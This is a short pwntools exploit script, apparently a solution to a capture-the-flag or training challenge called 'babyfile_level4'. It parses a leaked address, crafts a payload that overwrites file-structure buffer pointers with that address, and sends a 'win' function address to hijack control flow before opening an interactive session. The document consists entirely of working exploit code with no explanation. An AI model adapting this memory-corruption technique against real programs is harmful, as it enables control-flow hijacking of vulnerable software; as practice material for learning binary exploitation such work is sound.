from pwn import *

binary = './babyfile_level4'

p = process(binary)
s = '''
b * challenge+233
'''

win = 0x00401316

p.recvuntil("is stored at: ")
leak = int(p.recv(14).decode(), 16)



offset_to_buf_base = 0x8 * 7
payload = b'\x00' * offset_to_buf_base
payload += p64(leak)
payload += p64(leak + 0x110)
payload += b'\x00' * (0x8 * 5)
payload += p64(0)


p.sendline(payload)
gdb.attach(p, s)
p.sendline(p64(win) + b'1' * 0x120)



p.interactive()
